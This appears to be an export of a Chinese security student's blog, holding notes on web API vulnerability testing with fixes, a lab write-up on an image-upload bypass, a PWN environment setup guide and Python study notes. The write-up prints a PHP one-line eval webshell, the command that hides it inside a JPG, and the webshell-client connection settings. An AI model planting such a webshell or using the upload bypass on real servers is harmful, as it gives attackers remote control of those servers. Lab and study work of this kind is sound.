title="接口调用遍历测试"></a>接口调用遍历测试</h2><p>web接口一般将常见的一些功能需求进行封装，通过传入不同的参数来获取数据或者执行相应的功能，例如通过接口传入id参数，返回对应id的一些信息，在安全测试中，可以使用bp作为http代理，记录所有请求和响应信息，通过bp以登录后的状态对整站进行爬取，再使用过滤功能找到传入id参数的http请求，通过intruder对id参数进行遍历，看是否返回不同的响应信息，若不同的id值对应不同用户的信息，则说明存在漏洞。</p><h3 id="测试过程（看不懂，书166页）"><a href="#测试过程（看不懂，书166页）" class="headerlink" title="测试过程（看不懂，书166页）"></a>测试过程（看不懂，书166页）</h3><p>略</p><h3 id="修复建议-39"><a href="#修复建议-39" class="headerlink" title="修复建议"></a>修复建议</h3><p>在session中存储当前用户的凭证或id，只有传入凭证或id参数值与Session中的一致才返回数据内容</p><h2 id="接口调用参数篡改测试"><a href="#接口调用参数篡改测试" class="headerlink" title="接口调用参数篡改测试"></a>接口调用参数篡改测试</h2><p>修改对应请求中的手机号或邮箱参数值，修改后能接收到信息证明漏洞存在</p><h3 id="测试过程-26"><a href="#测试过程-26" class="headerlink" title="测试过程"></a>测试过程</h3><ul><li>在验证码页面单击重新发送，抓包，将手机号码参数改为其他手机号，修改后的手机接收到验证码</li></ul><h3 id="修复建议-40"><a href="#修复建议-40" class="headerlink" title="修复建议"></a>修复建议</h3><ul><li>会话session中存储重要凭证，在忘记密码、重新发送验证码等业务中，从session获取用户凭证而不是从客户请求的参数中获取</li><li>从客户端处获取手机号、邮箱等账号信息，要与session中的凭证进行对比，验证通过后才允许进行业务操作。</li></ul><h2 id="接口未授权访问-x2F-调用测试"><a href="#接口未授权访问-x2F-调用测试" class="headerlink" title="接口未授权访问/调用测试"></a>接口未授权访问/调用测试</h2><p>在正常业务中，敏感功能的接口需要对访问者身份进行验证，通过后才允许调用接口，若接口没有身份验证，那么攻击者无须登录验证即可调用接口操作。</p><p>bp作为Http代理，在登录状态下记录所有请求和响应信息，筛选出敏感功能、返回敏感数据的请求，在未登录的情况下，使用浏览器访问对应敏感功能的请求，若返回的数据与与登录状态后的一致，则存在漏洞</p><h3 id="测试过程（又是个bp爬取的，妈的不会，176页）"><a href="#测试过程（又是个bp爬取的，妈的不会，176页）" class="headerlink" title="测试过程（又是个bp爬取的，妈的不会，176页）"></a>测试过程（又是个bp爬取的，妈的不会，176页）</h3><p>略</p><h3 id="修复建议-41"><a href="#修复建议-41" class="headerlink" title="修复建议"></a>修复建议</h3><p>采用token校验方式，在url中添加一个token参数，只有token验证通过才返回接口数据且token使用一次后失效</p><p>在接口被调用时，后端会对会话状态进行验证，若已经登录便返回接口数据，如果未登录则返回错误信息。</p><h2 id="Callback自定义测试"><a href="#Callback自定义测试" class="headerlink" title="Callback自定义测试"></a>Callback自定义测试</h2><p>在浏览器中存在同源策略，同源策略是指域名、协议、端口相同，当使用Ajax异步传输数据时，非同源域名之间会存在限制，其中有一种解决方法时jsonp，基本原理是利用了html里<code>&lt;script&gt;&lt;/script&gt;</code>元素标签，远程调用json文件来实现数据传递，jsonp技术这种一般使用callback（回调函数）参数来声明回调时所使用的函数名，由于没有使用白名单的方法进行限制callback的函数名，导致攻击者可以自定义callback内容，从而触发xss等漏洞</p><h3 id="测试过程（178页）"><a href="#测试过程（178页）" class="headerlink" title="测试过程（178页）"></a>测试过程（178页）</h3><p>略</p><h3 id="修复建议-42"><a href="#修复建议-42" class="headerlink" title="修复建议"></a>修复建议</h3><ul><li>严格定义 HTTP 响应中的 Content-Type 为json 数据格式：<code>Content-Type：application/json</code></li><li>建立callback函数白名单，如果传入的callback参数值不在白名单内，跳转到统一的异常界面阻止其继续输出。</li><li>对callback参数进行HTML实体编码来过滤掉<code>“&lt;”、“&gt;”</code>等字符。</li></ul><h2 id="WebService测试"><a href="#WebService测试" class="headerlink" title="WebService测试"></a>WebService测试</h2><p>WebService是一种跨编程语言和跨操作系统平台的远程调用技术。XML+XSD、SOAP（Simple Object Access Protocol）和WSDL（WebServices Description Language）就是构成WebService平台的三大技术，其中XML+XSD用来描述、表达要传输的数据；SOAP是用于交换XML编码信息的轻量级协议，一般以XML或者XSD作为载体，通过HTTP协议发送请求和接收结果，SOAP协议会在HTTP协议的基础上增加一些特定的HTTP消息头；WSDL是一个基于XML的用于描述Web Service及其函数、参数和返回值的语言。</p><p>webservice就是一个应用程序向外界暴力出一个能通过web进行调用的api,它接收用户输入的参数，然后返回相关的数据内容，若一个webService完全信任用户的输入，不进行过滤，则有可能导致sql注入漏洞发生。</p><h3 id="测试过程（183页）"><a href="#测试过程（183页）" class="headerlink" title="测试过程（183页）"></a>测试过程（183页）</h3><h3 id="修复建议-43"><a href="#修复建议-43" class="headerlink" title="修复建议"></a>修复建议</h3><ul><li>为webservice添加身份认证，认证成功后才允许访问和调用</li><li>webservice中接收输入参数的函数，在后端应该对输入参数进行过滤及净化，在处理后才入库查询</li><li>在敏感功能的函数中，添加密码认证，认证后才允许调用敏感功能的函数。</li></ul><h1 id="实践篇"><a href="#实践篇" class="headerlink" title="实践篇"></a>实践篇</h1><h1 id="账号安全案例总结"><a href="#账号安全案例总结" class="headerlink" title="账号安全案例总结"></a>账号安全案例总结</h1><p>略</p><h3 id="中间人攻击"><a href="#中间人攻击" class="headerlink" title="中间人攻击"></a>中间人攻击</h3><p>是攻击者插入到原本直接通信的双方中间，让双方以为还在直接跟对方通信，但实际上双方的通信对象已变成了攻击者，同时信息已经被中间人获取或篡改。而中间人攻击不仅可以捕获HTTP未加密的传输数据，更可以捕获HTTPS协议加密的数据。<br>HTTPS中间人攻击一般分为SSL连接建立前的攻击，以及HTTPS传输过程中的攻击。常见的HTTPS中间人攻击，会首先需结合ARP、DNS欺骗、伪造CA证书等技术，来对会话进行拦截。</p><h3 id="SSL证书欺骗"><a href="#SSL证书欺骗" class="headerlink" title="SSL证书欺骗"></a>SSL证书欺骗</h3><p>通过DNS劫持和局域网ARP欺骗甚至网关劫持等技术，将用户访问重定向到攻击者的设备上，让用户机器与攻击者机器建立https链接，而攻击者机器再跟web服务端连接，这样攻击者分别与用户和真正的服务器建立ssl连接。</p><h3 id="SSL劫持"><a href="#SSL劫持" class="headerlink" title="SSL劫持"></a>SSL劫持</h3><p>将页面中https超链接替换成http版本，用户始终以明文形式进行通信。</p><h3 id="撞库攻击"><a href="#撞库攻击" class="headerlink" title="撞库攻击"></a>撞库攻击</h3>]]></content>
    
    
    
    <tags>
      
      <tag>业务渗透</tag>
      
      <tag>WEB,学习笔记</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>WebShell文件上传漏洞分析溯源(第3题)</title>
    <link href="/2022/11/02/%E9%9D%B6%E5%9C%BA%EF%BC%9AWebShell%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E6%BA%AF%E6%BA%90(%E7%AC%AC3%E9%A2%98)/"/>
    <url>/2022/11/02/%E9%9D%B6%E5%9C%BA%EF%BC%9AWebShell%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E6%BA%AF%E6%BA%90(%E7%AC%AC3%E9%A2%98)/</url>
    
    <content type="html"><![CDATA[<h1 id="背景介绍"><a href="#背景介绍" class="headerlink" title="背景介绍"></a>背景介绍</h1><p>某部门为了方便内部人员上传聚餐的活动图片，在某服务器上新增的图片上传功能在被安全工程师”墨者”检测发现漏洞后，程序员做了修复，【上一次漏洞地址】。”墨者”负责对修复后的系统做复测，然而发现还是存在高危漏洞。</p><p>实训目标</p><ol><li>掌握常见图片类型的文件头内容；</li><li>掌握表单数据通过POST提交数据时，对数据的修改方法；</li><li>了解WebShell是什么及其作用；</li><li>了解PHP程序的WebShell脚本的执行原理；</li></ol><p>解题方向</p><p>绕过页面对可执行文件上传的限制，利用WebShell读取服务器上的源代码内容。</p><h1 id="解题"><a href="#解题" class="headerlink" title="解题"></a>解题</h1><p>随便上传一个图片，返回信息为：文件上传成功，保存于：uploads/王也1.jpg</p><p>制作一句话图片木马</p><pre><code class="hljs">&lt;?php @eval($_POST['woshimuma']); ?&gt;</code></pre><p>新建文件下一句话，在其下存入木马文件2.php和图片1.jpg,在该目录下打开cmd</p><pre><code class="hljs">copy 1.jpg/b+2.php muma.jpg</code></pre><p>生成一句话图片木马，上传，bp拦截，修改<code>muma.jpg</code>后缀为php。</p><p>上传成功，得到路径，使用蚁剑连接。</p><p>蚁剑连接成功：<br>（图床又有毛病了，直接手打吧）</p><figure class="highlight awk"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs awk">url地址： ip:端口<span class="hljs-regexp">/uploads/mum</span>a.php<br>连接密码： woshimuma1<br>编码设置： UTF8<br>连接类型： PHP<br></code></pre></td></tr></tbody></table></figure><p>找到key: <code>mozheece9dc52403a1a5249a9075e4de</code></p><h1 id="拓展"><a href="#拓展" class="headerlink" title="拓展"></a>拓展</h1><h2 id="常见图片的头文件格式"><a href="#常见图片的头文件格式" class="headerlink" title="常见图片的头文件格式"></a>常见图片的头文件格式</h2><ol><li><code>.jpeg</code><ol><li>文件头标识 (2 bytes): 0XFF, 0XD8 (SOI)</li><li>文件结束标识 (2 bytes): 0XFF, 0XD9 (EOI)</li></ol></li><li><code>.png</code><ol><li>文件头标识 (8 bytes)：0X89 0X50 0X4E 0X47 0X0D 0X0A 0X1A 0X0A</li></ol></li><li><code>.bmp</code><ol><li>文件头标识 (2 bytes)：0X42 0X4D</li></ol></li><li><code>.gif</code><ol><li>文件头标识 (6 bytes)0X47 0X49 0X46 0X38 0X39(37) 0X61        G I F 8 9 (7) a</li></ol></li><li><code>.tiff</code><ol><li>文件头标识 (2 bytes) 0X4D 0X4D 或 0X49 0X49</li></ol></li></ol><h2 id="Form表单、四种常见的POST请求提交数据方式"><a href="#Form表单、四种常见的POST请求提交数据方式" class="headerlink" title="Form表单、四种常见的POST请求提交数据方式"></a>Form表单、四种常见的POST请求提交数据方式</h2><h3 id="浏览器行为：Form表单提交"><a href="#浏览器行为：Form表单提交" class="headerlink" title="浏览器行为：Form表单提交"></a>浏览器行为：Form表单提交</h3><ol><li>form表单常用属性<ol><li>action: url地址，服务器接收表单数据的地址</li><li>method: 提交服务器的http方法，一般为post和get</li><li>name: 唯一性</li><li>enctype: 表单数据提交时使用的编码类型，默认使用<code>pplication/x-www-form-urlencoded</code>,如果使用post请求，则请求头中的content-type指定值就是该值，如果表单中有上传文件，编码类型需要使用<code>multipart/form-data</code>类型，才能完成传递文件数据。</li></ol></li></ol><p>enctype为form表单数据的编码格式，Content-type为Http传输的数据的编码格式。</p><ol start="2"><li>浏览器提交表单时，会执行如下步骤<ol><li>识别出表单中表单元素的有效项，作为提交项</li><li>构建一个表单数据集</li><li>根据form表单中的enctype属性的值作为content-type对数据进行编码</li><li>根据form表单中的action属性和method属性向指定的地址发送数据</li></ol></li><li>提交方式<ol><li>get: 表单数据会被encodeURIComponent后以参数的形式：name=value&amp;name2=value2附带在url?后面，再发送给服务器，并在url中显示出来。</li><li>post: enctype默认<code>application/x-www-form-urlencoded</code>对表单数据进行编码，数据以键值对在http请求体重发送给服务器，如果enctype属性为<code>multipart/form-data</code>,则以消息的形式发送给服务器。</li></ol></li></ol><h3 id="Post请求下的Content-Type类型（编码类型）"><a href="#Post请求下的Content-Type类型（编码类型）" class="headerlink" title="Post请求下的Content-Type类型（编码类型）"></a>Post请求下的Content-Type类型（编码类型）</h3><ul><li>application/x-www-form-urlencoded</li></ul><p>浏览器的原生 <code>&lt;form&gt;</code> 表单，如果不设置 <code>enctype </code>属性，那么最终就会以 <code>application/x-www-form-urlencoded </code>方式提交数据。请求类似于下面这样:</p><pre><code class="hljs">POST http://www.example.com HTTP/1.1Content-Type: application/x-www-form-urlencoded;charset=utf-8title=test&amp;sub%5B%5D=1&amp;sub%5B%5D=2&amp;sub%5B%5D=3</code></pre><p><code>Content-Type</code> 被指定为 <code>application/x-www-form-urlencoded</code>；其次，提交的数据按照 <code>key1=val1&amp;key2=val2</code> 的方式进行编码，key 和 val 都进行了 URL 转码。</p><ul><li>multipart/form-data</li></ul><p>使用表单上传文件时，必须让<code> &lt;form&gt;</code> 表单的 enctype 等于 multipart/form-data。</p><ul><li>application/json</li><li>text/xml: 一种使用 HTTP 作为传输协议，XML 作为编码方式的远程调用规范</li></ul><p>相比之下，get方式的数据提交方式（编码方式）只有一种，就是application/x-www-form-urlencoding</p><h2 id="webshell"><a href="#webshell" class="headerlink" title="webshell"></a>webshell</h2><p><code>webshell</code>是网页后门，本质上是一种网页文件，一般由asp,php,jsp,asp.net等语言开发，<code>shell</code>的含义是取得对服务器某种程度上操作命令。常见的webshell有小马，大马，一句话木马</p><h4 id="作用"><a href="#作用" class="headerlink" title="作用"></a>作用</h4><ol><li>webshell被站长常用于网站管理、服务器管理等。根据FSO权限不同，作用有在线编辑网页脚本、上传下载文件、查看数据库、执行任意程序命令等。</li><li>被入侵者利用，从而达到控制网站服务器的目的。</li></ol><h3 id="webshell常见检测方式"><a href="#webshell常见检测方式" class="headerlink" title="webshell常见检测方式"></a>webshell常见检测方式</h3><ul><li>静态检测：通过匹配特征码、特征值、危险函数来查找webshell，但只能查找已知的webshell，主流的检测方法有关键字检查、审核代码逻辑等。速度快、对已知的webshell查找准确率高；误报率高，存在漏报，会被绕过。</li><li>动态监测： webshell在执行时表现出来的特征，我们称为动态特征。准确性高，但耗时、占用资源多</li></ul><p>主流的检测方法有文件状态对比(File Info Comparison)、运行特征(Feature Matching)、访问行为检测(Access Behavior)等。</p>]]></content>
    
    
    
    <tags>
      
      <tag>墨者学院</tag>
      
      <tag>文件上传</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Linux18下搭建PWN环境</title>
    <link href="/2022/11/02/Linux18%E4%B8%8B%E6%90%AD%E5%BB%BApwn%E7%8E%AF%E5%A2%83/"/>
    <url>/2022/11/02/Linux18%E4%B8%8B%E6%90%AD%E5%BB%BApwn%E7%8E%AF%E5%A2%83/</url>
    
    <content type="html"><![CDATA[<h1 id="安装Pwntools"><a href="#安装Pwntools" class="headerlink" title="安装Pwntools"></a>安装Pwntools</h1><pre><code class="hljs">sudo apt-get update #更新源sudo apt-get install python-pip #安装pip</code></pre><blockquote><p>出现报错 :</p></blockquote><figure class="highlight awk"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs awk">E: 无法获得锁 <span class="hljs-regexp">/var/</span>lib<span class="hljs-regexp">/dpkg/</span>lock-frontend - open (<span class="hljs-number">11</span>: 资源暂时不可用)<br>E: 无法获取 dpkg 前端锁 (<span class="hljs-regexp">/var/</span>lib<span class="hljs-regexp">/dpkg/</span>lock-frontend)，是否有其他进程正占用它？<br></code></pre></td></tr></tbody></table></figure><blockquote><p>解决方法：</p></blockquote><figure class="highlight awk"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs awk">sudo rm <span class="hljs-regexp">/var/</span>lib<span class="hljs-regexp">/dpkg/</span>lock-frontend<br>sudo rm <span class="hljs-regexp">/var/</span>cache<span class="hljs-regexp">/apt/</span>archives/lock  <br>sudo rm <span class="hljs-regexp">/var/</span>lib<span class="hljs-regexp">/dpkg/</span>lock<br></code></pre></td></tr></tbody></table></figure><p>续：</p><pre><code class="hljs">pip install --upgrade pip # 升级pipsudo pip install setuptools #安装setuptoolssudo apt-get install python-dev #安装python-devsudo pip install pwntools #安装pwntools</code></pre><p>安装结束之后进入python交互模式，输入import pwn后无报错即可。</p><h1 id="安装其他插件"><a href="#安装其他插件" class="headerlink" title="安装其他插件"></a>安装其他插件</h1><figure class="highlight awk"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs awk"> <span class="hljs-comment"># 安装socat</span><br>sudo apt install socat<br> <span class="hljs-comment"># 安装socat </span><br>sudo apt install socat<br> <span class="hljs-comment"># 安装zio</span><br>sudo pip install zio​<br> <span class="hljs-comment"># 安装gcc</span><br>sudo apt-get install gcc<br> <span class="hljs-comment"># 安装gcc-multilib</span><br>sudo apt-get install gcc-multilib​<br> <span class="hljs-comment"># 安装gedit</span><br>sudo apt install gedit<br> <span class="hljs-comment"># 安装vim</span><br>sudo apt install vim<br> <span class="hljs-comment">#安装peda插件</span><br>git clone https:<span class="hljs-regexp">//gi</span>thub.com<span class="hljs-regexp">/longld/</span>peda.git ~/peda<br>echo <span class="hljs-string">"source ~/peda/peda.py"</span> &gt;&gt; ~/.gdbinit<br> <span class="hljs-comment">#安装gef插件 </span><br>wget -q -O- https:<span class="hljs-regexp">//gi</span>thub.com<span class="hljs-regexp">/hugsy/g</span>ef<span class="hljs-regexp">/raw/m</span>aster/gef.sh | sh <br>wget -q -O ~<span class="hljs-regexp">/.gdbinit-gef.py https:/</span><span class="hljs-regexp">/github.com/</span>hugsy<span class="hljs-regexp">/gef/</span>raw<span class="hljs-regexp">/master/g</span>ef.py<br>echo source ~<span class="hljs-regexp">/.gdbinit-gef.py &gt;&gt; ~/</span>.gdbinit<br></code></pre></td></tr></tbody></table></figure><h1 id="IDA远程调试Linux"><a href="#IDA远程调试Linux" class="headerlink" title="IDA远程调试Linux"></a>IDA远程调试Linux</h1><p>顺便搞一下得了。</p><p>找IDA文件/dbgsrv下面的linux_server和linux_server64,我ida里的是linux_serverx64，不过问题不大。</p><p>将俩文件复制到linux下，并复制保存好改路径，一会儿要用。</p><p>ifconfig查看linux的ip，然后复制保存好，监听端口一般都是默认的23946不用管。</p><p>在linux上运行linux_server报错权限不足，用命令chmod开一下。</p><pre><code class="hljs">chmod 777 linux_server</code></pre><p>在linux端运行linux_server: <code>./linux_server</code></p><p>打开ida（32位的）</p><p>然后 <code>Debugger-&gt; Run-&gt; Remote Linux debugger</code></p><p>输入信息：</p><figure class="highlight awk"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs awk">Application: <span class="hljs-regexp">/home/</span>sudo<span class="hljs-regexp">/Desktop/i</span>da_linuxsever/linux_server<br>Directory: <span class="hljs-regexp">/home/</span>q<span class="hljs-regexp">/桌面/i</span>da_linuxsever<br>Parameters: [不用写]<br>Hostname: [linux的ip]<br>Password: [linux的密码]<br></code></pre></td></tr></tbody></table></figure><p>连接成功。</p><h1 id="拓展"><a href="#拓展" class="headerlink" title="拓展"></a>拓展</h1><h2 id="chmod用法"><a href="#chmod用法" class="headerlink" title="chmod用法"></a>chmod用法</h2><p>chmod 文件/目录权限设置命令</p><ol><li>语法：<code>chmod [对谁操作] [操作符] [赋予的权限] 文件名</code></li><li>操作对象：<ol><li>u 用户user,表现文件或目录的所有者</li><li>g 用户组group 表现文件或目录所属的用户组</li><li>o 其他用户other</li><li>a 所有用户all</li></ol></li><li>操作符： <ol><li><code>+</code> 添加权限</li><li><code>-</code> 减少权限</li><li><code>=</code> 直接给定一个权限</li></ol></li><li>权限： <code>r、w、x</code></li></ol><p>实例：（网上找的，感觉以后直接拿来用就好了）</p><figure class="highlight shell"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash"><span class="hljs-built_in">chmod</span> u+x file 　　　 给file的属主增加执行权限</span><br><span class="hljs-meta prompt_">$ </span><span class="language-bash"><span class="hljs-built_in">chmod</span> 751 file 　　　 给file的属主分配读、写、执行(7)的权限，给file的所在组分配读、执行(5)的权限，给其他用户分配执行(1)的权限</span><br><span class="hljs-meta prompt_">$ </span><span class="language-bash"><span class="hljs-built_in">chmod</span> u=rwx,g=rx,o=x file 上例的另一种形式</span><br><span class="hljs-meta prompt_">$ </span><span class="language-bash"><span class="hljs-built_in">chmod</span> =r file 　　　　为所有用户分配读权限</span><br><span class="hljs-meta prompt_">$ </span><span class="language-bash"><span class="hljs-built_in">chmod</span> 444 file 　　　　 同上例</span><br><span class="hljs-meta prompt_">$ </span><span class="language-bash"><span class="hljs-built_in">chmod</span> a-wx,a+r file 　　 　 同上例</span><br><span class="hljs-meta prompt_">$ </span><span class="language-bash"><span class="hljs-built_in">chmod</span> -R u+r directory 　 递归地给directory目录下所有文件和子目录的属主分配读的权限</span><br><span class="hljs-meta prompt_">$ </span><span class="language-bash"><span class="hljs-built_in">chmod</span> 4755 　　设置用ID，给属主分配读、写和执行权限，给组和其他用户分配读、执行的权限。</span><br></code></pre></td></tr></tbody></table></figure><p>其中a,b,c各为一个数字，分别表示User、Group、及Other的权限。r=4，w=2，x=1</p><blockquote><p>若要rwx属性则4+2+1=7；<br>若要rw-属性则4+2=6；<br>若要r-x属性则4+1=5。</p></blockquote><p>​</p>]]></content>
    
    
    
    <tags>
      
      <tag>搭建环境</tag>
      
      <tag>PWN</tag>
      
      <tag>ida远程</tag>
      
      <tag>linux</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>靶场：Xls文件分析溯源</title>
    <link href="/2022/10/10/%E9%9D%B6%E5%9C%BA%EF%BC%9AXLS%E6%96%87%E4%BB%B6%E5%88%86%E6%9E%90%E6%BA%AF%E6%BA%90/"/>
    <url>/2022/10/10/%E9%9D%B6%E5%9C%BA%EF%BC%9AXLS%E6%96%87%E4%BB%B6%E5%88%86%E6%9E%90%E6%BA%AF%E6%BA%90/</url>
    
    <content type="html"><![CDATA[<h1 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h1><p>背景介绍</p><p>墨者机缘巧合下得到了一个Xls文件，打开却发现该文件带密码验证。</p><p>实训目标</p><p>了解Xls文件的密码猜解手段；</p><p>解题方向</p><p>对文件作密码猜解手段</p><p><img src="https://s2.loli.net/2022/10/10/O5K8wQLBEiZmXRJ.png" alt="image.png"></p><h1 id="解题"><a href="#解题" class="headerlink" title="解题"></a>解题</h1><p>搜到一个将xls文件后缀改成rar然后删除对应信息，然后解密的手段，试了一下，office2019没有这个bug，hhh.</p><p>不小心看到了评论区的解答，用了aopr直接把密码给爆破了……</p>]]></content>
    
    
    
    <tags>
      
      <tag>WEB</tag>
      
      <tag>墨者学院</tag>
      
      <tag>文件分析</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Python学习10-学生信息管理系统</title>
    <link href="/2022/09/25/python%E5%AD%A6%E4%B9%A010/"/>
    <url>/2022/09/25/python%E5%AD%A6%E4%B9%A010/</url>
    
    <content type="html"><![CDATA[<h1 id="需求分析"><a href="#需求分析" class="headerlink" title="需求分析"></a>需求分析</h1><ol><li>添加学生及成绩信息</li><li>将学生信息保存到文件中</li><li>修改和删除学生信息</li><li>查询学生信息</li><li>根据学生成绩进行排序</li><li>统计学生的总分</li></ol><h1 id="系统开发环境"><a href="#系统开发环境" class="headerlink" title="系统开发环境"></a>系统开发环境</h1><ol><li>操作系统：win10</li><li>python解释器：3.9</li><li>开发工具：pycharm</li><li>python内置模块：os,re</li></ol><h1 id="主函数功能"><a href="#主函数功能" class="headerlink" title="主函数功能"></a>主函数功能</h1><ol start="0"><li>退出系统</li><li>录入学生信息，insert()</li><li>查找学生信息，search()</li><li>删除学生信息，delete()</li><li>修改学生信息，modify()</li><li>对学生成绩排序，sort()</li><li>统计学生总人数，total()</li><li>显示所有的学生信息，show()</li></ol>]]></content>
    
    
    
    <tags>
      
      <tag>python</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Python学习9</title>
    <link href="/2022/09/23/python%E5%AD%A6%E4%B9%A09/"/>
    <url>/2022/09/23/python%E5%AD%A6%E4%B9%A09/</url>
    
    <content type="html"><![CDATA[<h1 id="模块"><a href="#模块" class="headerlink" title="模块"></a>模块</h1><ul><li>一个模块中可以包含N多个函数</li><li>在python中一个扩展名为.py的文件就是一个模块</li><li>好处：<ul><li>方便其他程序和脚本的导入并使用</li><li>避免函数名和变量名冲突</li><li>提高代码的可维护性和可重用性</li></ul></li></ul><h2 id="自定义模块"><a href="#自定义模块" class="headerlink" title="自定义模块"></a>自定义模块</h2><ol><li>创建模块：新建一个.py文件，尽量不要与python自带的标准名呈相同</li><li>导入模块：<ol><li>所有： <code>import 模块名称 [as 别名]</code></li><li>指定： <code>from 模块名称 import 函数/变量/类</code></li></ol></li></ol><figure class="highlight stylus"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs stylus">import math#关于数学运算<br><span class="hljs-function"><span class="hljs-title">print</span><span class="hljs-params">(id(math)</span></span>)<br><span class="hljs-function"><span class="hljs-title">print</span><span class="hljs-params">(type(math)</span></span>)#&lt;class <span class="hljs-string">'module'</span>&gt;<br><span class="hljs-function"><span class="hljs-title">print</span><span class="hljs-params">(math)</span></span>#&lt;module <span class="hljs-string">'math'</span> (built-<span class="hljs-keyword">in</span>)&gt;<br><span class="hljs-function"><span class="hljs-title">print</span><span class="hljs-params">(math.pi)</span></span>#<span class="hljs-number">3.141592653589793</span><br><span class="hljs-function"><span class="hljs-title">print</span><span class="hljs-params">(dir(math)</span></span>)<br><span class="hljs-function"><span class="hljs-title">print</span><span class="hljs-params">(math.pow(<span class="hljs-number">2</span>,<span class="hljs-number">3</span>)</span></span>)#<span class="hljs-number">8.0</span><br><span class="hljs-function"><span class="hljs-title">print</span><span class="hljs-params">(math.ceil(<span class="hljs-number">9.00001</span>)</span></span>)#<span class="hljs-number">10</span> ceil 天花板<br><span class="hljs-function"><span class="hljs-title">print</span><span class="hljs-params">(math.floor(<span class="hljs-number">9.99999</span>)</span></span>)#<span class="hljs-number">9</span> floor 地板<br></code></pre></td></tr></tbody></table></figure><p>或：</p><pre><code class="hljs">from math import piimport mathprint(pi)#3.141592653589793print(pow(2,3))#8 定义位置在builtins.pyprint(math.pow(2,3))# 8.0  定义位置在math.py</code></pre><p>eg:</p><p>(1) 创建calc.py 作为自定义模块</p><pre><code class="hljs">def add(a,b):    return a+bdef div(a,b):    return a/b</code></pre><p>(2)创建demo3.py调用自定义模块calc.py</p><pre><code class="hljs">import calcprint(calc.add(10,20))print(calc.div(10,4))</code></pre><p>或 </p><pre><code class="hljs">from calc import addprint(add(10,20))</code></pre><h2 id="以主程序形式运行"><a href="#以主程序形式运行" class="headerlink" title="以主程序形式运行"></a>以主程序形式运行</h2><p>在每个模块的定义中都包括一个记录模块名称的变量__name__，程序可以检查该变量以确定它在哪个模块中执行，若一个模块不是被导入到其他程序中执行，那么它可能在解释器的顶级模块中执行，顶级模块的__name__变量的值为__main__</p><pre><code class="hljs">if __name__=='__main__':        pass</code></pre><p>新建calc1.py中：</p><pre><code class="hljs">def add(a,b):    return a+bif __name__=='__name__':    print(add(10,20))</code></pre><p>在demo4.py中：</p><pre><code class="hljs">import calc1print(calc1.add(100,200))</code></pre><blockquote><p>只有运行calc1.py时，才会执行add(10,20);当demo4.py调用calc1时，不执行if语句中的内容</p></blockquote><h2 id="Python中的包"><a href="#Python中的包" class="headerlink" title="Python中的包"></a>Python中的包</h2><ol><li>包是一个分层次的目录结构，它将一组功能相近的模块组织在一个目录下</li><li>作用：代码规范；避免模块名称冲突</li><li>包与目录的区别：<ol><li>包含__init__.py文件的目录称作包</li><li>目录中通常不包含__init__.py文件</li></ol></li><li>包的导入：<code>import 包名.模块名</code></li></ol><p>包：New-&gt;Python package  默认有__init__.py</p><p>目录：New-&gt;Directory </p><p>eg:</p><p>新建包pageage，在其下新建模块moduleA.py和moduleB.py</p><pre><code class="hljs">#moduleA.pya=10#moduleB.pyb=100</code></pre><p>新建demo5.py用于导入包：</p><pre><code class="hljs">import pageage.moduleA as ma #ma为别名 #print(pageage.moduleA.a)print(ma.a)</code></pre><p>导入带有包的模块时：</p><ol><li><p>使用import方式，只能跟包名或模块名</p><p> import pageage<br> import calc</p></li><li><p>使用from…import可以导入包，模块，函数，变量</p><p> from pageage import moduleA<br> from pageage.moduleA import a</p></li></ol><h2 id="常用内置模块"><a href="#常用内置模块" class="headerlink" title="常用内置模块"></a>常用内置模块</h2><ul><li>sys 与python解释器及其环境操作相关的标准库</li><li>time 提供与时间相关的各种函数的标准库</li><li>os 访问操作系统服务功能的标准库</li><li>calendar 日期相关标准库</li><li>urllib 读取来自我网上（服务器）的数据标准库</li><li>json 用于使用JSON序列化和反序列化对象</li><li>re 用于在字符串中执行正则表达式匹配和替换</li><li>math 算术相关标准库</li><li>decimal 精确控制运算精度，有效数位和四舍五入的十进制运算</li><li>logging 日志信息</li></ul><figure class="highlight routeros"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span 